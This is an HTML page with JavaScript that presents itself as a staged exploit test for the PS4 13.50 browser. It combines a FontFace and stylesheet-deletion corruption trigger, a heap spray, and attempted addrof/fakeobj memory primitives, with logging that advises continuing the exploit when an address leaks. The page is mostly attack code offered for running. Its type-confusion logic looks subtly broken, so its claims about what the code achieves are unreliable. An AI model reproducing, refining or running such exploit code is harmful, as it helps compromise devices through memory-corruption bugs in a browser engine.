<!DOCTYPE html>
<html>
<head>
<title>PS4 13.50 - Improved addrof/fakeobj</title>
</head>
<body>
<h1 id="status">Improved addrof/fakeobj Test</h1>
<button onclick="runExploit()" style="font-size: 24px; padding: 15px;">RUN</button>
<div id="log" style="font-family: monospace; font-size: 11px; white-space: pre-wrap; border: 2px solid white; padding: 10px; max-height: 85vh; overflow-y: scroll; background: #000; color: #0f0;"></div>

<script>
"use strict";

let logBuf = [];
function log(msg) {
    logBuf.push(msg);
    let d = document.getElementById('log');
    if (d) {
        d.textContent = logBuf.join('\n');
        d.scrollTop = d.scrollHeight;
    }
}

function hex(n) {
    if (n < 0) n = n >>> 0;
    return '0x' + n.toString(16).padStart(8, '0');
}

class Int64 {
    constructor(low, high) {
        this.low = low >>> 0;
        this.high = high >>> 0;
    }
    
    static fromDouble(d) {
        let buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = d;
        let parts = new Uint32Array(buf);
        return new Int64(parts[0], parts[1]);
    }
    
    asDouble() {
        let buf = new ArrayBuffer(8);
        let u32 = new Uint32Array(buf);
        u32[0] = this.low;
        u32[1] = this.high;
        return new Float64Array(buf)[0];
    }
    
    toString() {
        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
    }
}

let state = {
    phase: 0,
    corrupted: [],
    victim: null
};

// Phase 1: Corruption
function phase1() {
    log('[PHASE 1] Corruption\n');
    
    let style = document.createElement('style');
    style.id = 's';
    style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
    document.head.appendChild(style);
    
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    
    let corrupted = [];
    let fired = false;
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                for (let i = 0; i < 100; i++) {
                    corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                        unicodeRange: 'U+' + (0x100 + i).toString(16)
                    }));
                }
                document.getElementById('s').sheet.deleteRule(0);
                document.body.offsetTop;
                state.corrupted = corrupted;
                window.corrupted = corrupted;
            }
            return undefined;
        }
    });
    
    document.fonts.load('1em x', 'AB');
    log('OOM expected\n');
}

// Phase 2: Improved Type Confusion Setup
function phase2() {
    log('\n[PHASE 2] Improved Type Confusion\n');
    
    let fonts = state.corrupted;
    if (!fonts) {
        log('[ERROR] No corrupted fonts\n');
        return;
    }
    
    log('[*] Found ' + fonts.length + ' corrupted fonts\n');
    
    let victim = fonts[0];
    state.victim = victim;
    
    // KEY IMPROVEMENT: Use DIFFERENT arrays for storage vs retrieval
    // This forces the engine to truly confuse types rather than optimize
    
    let floatStorage = new Float64Array(100);
    let objStorage = new Array(100);
    
    // Fill with distinct patterns
    for (let i = 0; i < 100; i++) {
        floatStorage[i] = 1.1 * (i + 1);
        objStorage[i] = { id: i };
    }
    
    log('[*] Created separate storage arrays:');
    log('    floatStorage: Float64Array[100]');
    log('    objStorage: Array[100] of objects\n');
    
    // Spray to fix array positions in memory
    let spray = [];
    for (let i = 0; i < 1000; i++) {
        spray.push(new Float64Array(100));
        spray.push(new Array(100));
    }
    
    log('[*] Heap spray complete\n');
    
    // Now set up confusion on victim
    // The trick: access floatStorage but return from objStorage (or vice versa)
    
    let confusionProto = {
        _floats: floatStorage,
        _objs: objStorage,
        _confusionIndex: 50, // Use middle of arrays
        
        // addrof: Store object, but read from float array at SAME INDEX
        readAddrof: function(obj) {
            log('  [readAddrof] Storing object at objStorage[50]');
            this._objs[this._confusionIndex] = obj;
            
            // Force a property access that might confuse the engine
            this._objs.length;
            this._floats.length;
            
            // Now try to read the FLOAT at the same index
            // If confusion works, this reads the object pointer as a float
            log('  [readAddrof] Reading floatStorage[50]');
            return this._floats[this._confusionIndex];
        },
        
        // fakeobj: Store float, but read from obj array at SAME INDEX
        readFakeobj: function(addr) {
            log('  [readFakeobj] Storing float at floatStorage[50]');
            this._floats[this._confusionIndex] = addr;
            
            // Force confusion
            this._floats.length;
            this._objs.length;
            
            // Now try to read the OBJECT at the same index
            // If confusion works, this interprets the float as an object pointer
            log('  [readFakeobj] Reading objStorage[50]');
            return this._objs[this._confusionIndex];
        }
    };
    
    Object.setPrototypeOf(victim, confusionProto);
    
    log('[*] Installed improved confusion prototype\n');
    log('[*] Key difference: Storage and retrieval use different arrays');
    log('[*] This forces engine to confuse types at same memory location\n');
    
    window.state = state;
    window.victim = victim;
}

// Phase 3: Test Improved Primitives
function phase3() {
    log('\n[PHASE 3] Testing Improved Primitives\n');
    
    let victim = state.victim;
    if (!victim) {
        log('[ERROR] No victim\n');
        return;
    }
    
    // Test 1: addrof
    log('[TEST 1] addrof primitive\n');
    
    let testObj = { marker: 0xABCDEF, flag: true };
    log('[*] Test object: ' + JSON.stringify(testObj));
    
    try {
        let leaked = victim.readAddrof(testObj);
        log('[*] Returned value: ' + leaked);
        log('[*] Type: ' + typeof leaked);
        
        if (typeof leaked === 'number' && !isNaN(leaked)) {
            let addr = Int64.fromDouble(leaked);
            log('[*] As Int64: ' + addr.toString());
            
            // Check if it's different from pattern (1.1 * 51 = 56.1)
            if (Math.abs(leaked - 56.1) > 0.01) {
                log('[+] Value changed from pattern!');
                
                if (addr.high > 0x7f00 && addr.high < 0x8000) {
                    log('[+] HIGH WORD IN USERSPACE RANGE!');
                    log('[+] This looks like a REAL ADDRESS LEAK!');
                } else if (addr.high !== 0 || addr.low > 0x1000) {
                    log('[?] Non-zero address, might be tagged/encoded');
                } else {
                    log('[-] Zero or low value');
                }
            } else {
                log('[-] Still has pattern value (56.1)');
                log('[-] No confusion occurred');
            }
        }
        
    } catch(e) {
        log('[ERROR] ' + e.message);
    }
    
    log('\n[TEST 2] fakeobj primitive\n');
    
    try {
        // Use a distinctive address pattern
        let fakeAddr = (new Int64(0x41424344, 0x51525354)).asDouble();
        log('[*] Fake address: 0x51525354_41424344 as float');
        log('[*] As number: ' + fakeAddr);
        
        let result = victim.readFakeobj(fakeAddr);
        log('[*] Returned value: ' + result);
        log('[*] Type: ' + typeof result);
        
        if (typeof result === 'object' && result !== null) {
            log('[+] Got object back!');
            
            // Check if it's different from pattern object
            try {
                log('[*] Checking object properties...');
                log('[*] result.id = ' + result.id);
                
                if (result.id === 50) {
                    log('[-] Got original pattern object (id=50)');
                    log('[-] No confusion occurred');
                } else {
                    log('[+] DIFFERENT OBJECT!');
                    log('[+] fakeobj may be working!');
                }
            } catch(e) {
                log('[!] Error accessing properties: ' + e.message);
                log('[+] This might mean we got an INVALID object from address!');
                log('[+] That would prove fakeobj is interpreting our float!');
            }
        }
        
    } catch(e) {
        log('[ERROR] ' + e.message);
    }
    
    log('\n[ANALYSIS]\n');
    log('For addrof to work, we need:');
    log('  - Returned value is a number');
    log('  - Value is NOT 56.1 (the pattern)');
    log('  - High word looks like userspace (0x7f...)');
    log('');
    log('For fakeobj to work, we need:');
    log('  - Returned value is an object');
    log('  - Object is NOT {id: 50} (the pattern)');
    log('  - Or accessing it causes error (invalid pointer)');
}

// Phase 4: Alternative Approach
function phase4() {
    log('\n[PHASE 4] Alternative: Direct Buffer Correlation\n');
    
    let victim = state.victim;
    
    log('[*] If type confusion didn\'t work, try direct approach:\n');
    
    // Create ArrayBuffer with known pattern
    let ab = new ArrayBuffer(0x10000);
    let u32 = new Uint32Array(ab);
    let f64 = new Float64Array(ab);
    
    // Write unique marker
    u32[0] = 0xDEADBEEF;
    u32[1] = 0xCAFEBABE;
    u32[100] = 0x41424344;
    u32[101] = 0x51525354;
    
    log('[*] Created buffer with markers:');
    log('    u32[0-1]: 0xDEADBEEF 0xCAFEBABE');
    log('    u32[100-101]: 0x41424344 0x51525354\n');
    
    // Try to get this buffer's address
    try {
        let leaked = victim.readAddrof(ab);
        log('[*] ArrayBuffer address leak attempt: ' + leaked);
        
        if (typeof leaked === 'number') {
            let addr = Int64.fromDouble(leaked);
            log('[*] As Int64: ' + addr.toString());
        }
    } catch(e) {
        log('[ERROR] ' + e.message);
    }
    
    log('\n[RECOMMENDATION]\n');
    log('Based on Phase 3 results:');
    log('  1. If addrof showed userspace address → Continue exploit');
    log('  2. If fakeobj caused error → Good sign, refine technique');
    log('  3. If both returned patterns → Need different bug/approach');
}

function runExploit() {
    state.phase++;
    
    switch(state.phase) {
        case 1:
            phase1();
            break;
        case 2:
            phase2();
            log('\nClick for Phase 3\n');
            break;
        case 3:
            phase3();
            log('\nClick for Phase 4\n');
            break;
        case 4:
            phase4();
            break;
        default:
            log('\n[COMPLETE] Review Phase 3 output');
            break;
    }
}

log('PS4 13.50 - Improved addrof/fakeobj Test\n');
log('Technique: Separate storage arrays to force confusion\n');
log('Click RUN for Phase 1\n');

</script>
